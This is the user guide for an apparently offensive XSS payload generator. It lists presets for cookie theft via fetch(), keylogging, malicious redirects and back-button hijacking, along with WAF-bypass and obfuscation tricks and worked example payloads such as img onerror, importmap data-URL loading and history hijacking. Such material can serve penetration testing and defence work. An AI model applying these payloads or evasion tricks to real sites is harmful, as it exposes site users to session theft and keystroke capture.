# XSS-Payload-Generator user guide
0. This script is an XSS payload generator. Users can forward their requests in json format, with a variety of actions and WAF bypass tricks available.
   It does not have the ability to detect XSS vulnerabilities, and fuzzing or automation is not possible.
   It should not be used for illegal purposes. Now have fun!
   
2. [Available JSON Keys]
   - tag     : HTML tags that you want to generate(ex: "a", "img", "svg", "none") 
   - payload : Action that you want to perform
   - tricks  : Obfuscation or WAF bypass technique (Must be submitted in array like => "tricks":["case"] )
   - context : Escape the environment of the current insertion point (can be separated by commas)
   - content : Any text to be inside the tag

3. [Tag Options]
   - a, body, div, script, input, iframe, svg, details
   - none 

4. [Payload Presets]
   - alert        : alert(1)
   - cookie_steal : Send cookies using fetch()
   - redirect     : redirect to malicious page
   - keylogger    : key input interception
   - history      : Back-button hijacking by history API

5. [Tricks] When applying the trick, it should be enclosed in array form. ex) {"tag": "details", "tricks": ["var_assign"], "payload": "alert(1)"}
   - encoding     : base64, charcode, hex
   - Obfuscation  : case(upper/lower mixed), nested(like alealertrt), template(templete literal, backtic)
   - event        : event:[type] (media, input, interaction, modern), attr:[name]
   - Parsing Bypass
      space_jumble : bypass WAF regular expression by inserting tab(%09) and string(%0a) instead of blank
      slash_sep    : Use slash(/) instead of spaces as attribute separator

   - [Logic Bypass]:
      var_assign   : execute like=> x=alert,x(1)
      array_method : execute like=> [1].map(confirm)

   - Others:
      proto_var    : Insert control character inside protocol javascript: and it only works with <a> tags, but it really doesn't make difference
      framework    : Works in the form like {{constructor.constructor(...)(}} when your target is using Vue or AngularJS
      import_map   : Load bypassing external scripts using importmap function

6. [Context]
   - div, script, style: Close current existing tags
   - attr         : "> Escape existing html properties
   - js_func      : );// Escape existing JavaScript function
   - js_var_single: ';// Escape existing JavaScript variables

7. [Commands]
   - help, history, history_clear, exit

8. [Examples]
   - Basic: {"tag": "img", "payload": "alert(1)"}
     => <img onerror="alert(1)" src=x>

   - WAF parsing bypass: {"tag": "a", "tricks": ["space_jumble", "slash_sep"], "payload": "alert(1)"}
     => <a%0aonmouseover/="alert(1)">

   - {"tag": "details", "tricks": ["var_assign"], "payload": "confirm(1)"}
     => <details ontoggle="x=confirm,x(1)">

   - {"tag": "a", "tricks": ["proto_var", "case"], "payload": "alert(1)"}
     => <a href="java&#13;&#10;script:AlErT(1)">

   - Import Maps: {"tricks": ["import_map"], "payload": "alert(1)"}
     => <script type="importmap">{"imports": {"x": "data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>

   - History hijcking: {"tag": "body", "payload": "history"}
     => <body onmouseover="history.pushState(null,null,location.href);window.onpopstate=()=>location='https://github.com'">click here!</body>

9. [Useful event handler list]
    [MEDIA]       : onerror, onload, onplay, onplaying, onvolumechange
    [INPUT/FORM]  : onfocus, onblur, oninput, onchange, onsubmit, oninvalid
    [INTERACTION] : onmouseover, onmouseout, onclick, ondblclick, oncontextmenu, onwheel""[MODERN/PTR]  : onpointerover, onpointerenter, onpointerdown, onpointermove, onauxclick
    [MOBILE/TOUCH]: ontouchstart, ontouchmove, ontouchend, ontoggle
    [CSS/ANIM]    : onanimationstart, onanimationiteration, ontransitionend

